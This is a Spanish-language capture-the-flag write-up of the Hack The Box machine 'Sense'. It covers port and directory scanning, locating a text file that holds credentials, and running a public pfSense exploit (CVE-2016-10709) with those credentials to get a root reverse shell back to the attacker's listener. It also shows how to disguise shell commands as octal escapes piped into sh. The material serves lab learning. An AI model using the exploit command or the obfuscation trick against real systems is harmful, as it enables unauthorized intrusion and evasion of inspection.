# Sense-HTB
Resolucion de la maquina

## NMAP

```
sudo nmap -sSV -p80,443 10.129.76.69 -oN scan

```
 Tenemos el puerto 80 y el 443 abieto.

 ## FFUF

Aunque se necesito hacer esto recursivamente y se tuvo que usar el Dirbuster

```
ffuf -r -fc 404 -t 100  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://10.129.76.69/FUZZ.txt 

```

## Dirbuster

![image](https://github.com/gecr07/Sense-HTB/assets/63270579/1a524956-8a6f-4612-93a9-ed001a85aa0e)


![image](https://github.com/gecr07/Sense-HTB/assets/63270579/6e8a2471-2a37-4733-b3d1-3568191cb567)


Para encontrar cosas admito que es mejor esta herramienta. En este caso necesitabamos encontrar un txt.

```
dirbuster -u https://10.129.76.69 -t 20 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r dirout.ext -e php,txt,html
```

## searchsploit

```
searchsploit -x #examina
searchsploit -m # mueve

```

## RCE

Para buscar exploits aprendimos una cosa nueva poner entre comillas el cve por ejemplo: "CVE-2016-10709" (or Google will return others)

![image](https://github.com/gecr07/Sense-HTB/assets/63270579/bd04aa38-a5ef-45c4-855a-cfa7e64179c2)

```
python3 43560.py --rhost 10.129.76.69 --lhost 10.10.14.10 --lport 4444 --username rohit --password pfsense

```

Regresa una shell con privilegios de root no me dejo hacer ni full tty.

## Plus

Viendo un pcoo los writeups me di cuenta como funciona esta payload. por ejemplo para crear un payload mas o menos con esta tecnica.

![image](https://github.com/gecr07/Sense-HTB/assets/63270579/514be4fb-928e-45e9-b484-04eccfc30656)


```
# Si pones lo decodifica auque sea base octal nose asi funciona 
printf '\164\157\165\143\150\040\057\164\155\160\057\060\170\144\146'        
touch /tmp/0xdf

#Ahora si lo pasas a |sh|echo el echo solo mete un salto de linea.

printf '\164\157\165\143\150\040\057\164\155\160\057\060\170\144\146'|sh|echo

## Guarda los numeros octales decodificados en ese archivo

printf '\164\157\165\143\150\040\057\164\155\160\057\060\170\144\146' | xargs echo -e > archivo_decodificado.txt

```

> https://0xdf.gitlab.io/2021/03/11/htb-sense.html












































